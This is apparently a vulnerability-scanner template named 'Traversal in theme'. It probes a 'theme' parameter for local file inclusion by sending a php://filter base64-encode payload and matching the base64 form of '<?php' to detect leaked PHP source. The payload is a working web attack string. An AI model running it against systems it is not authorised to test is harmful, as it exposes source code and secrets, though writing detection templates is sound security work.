id: lfi6-0984
name: 'Traversal in theme'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via theme'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      theme:
        - 'php://filter/convert.base64-encode/resource=index'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
